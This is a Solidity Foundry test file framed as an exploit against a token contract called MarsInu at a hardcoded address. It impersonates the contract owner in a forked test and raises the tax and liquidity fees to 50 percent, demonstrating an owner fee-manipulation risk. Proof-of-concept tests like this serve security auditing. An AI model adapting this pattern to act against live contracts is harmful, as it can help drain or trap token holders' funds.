// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMarsInu {
    function owner() external view returns (address);
    function setTaxFeePercent(uint256 taxFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
    function _liquidityFee() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7;
    address attacker = address(this);
    IMarsInu internal target;
    address internal contractOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IMarsInu(TARGET);
        contractOwner = target.owner();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(contractOwner);

        target.setTaxFeePercent(50);
        target.setLiquidityFeePercent(50);

        vm.stopPrank();
        assertEq(target._liquidityFee(), 50, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
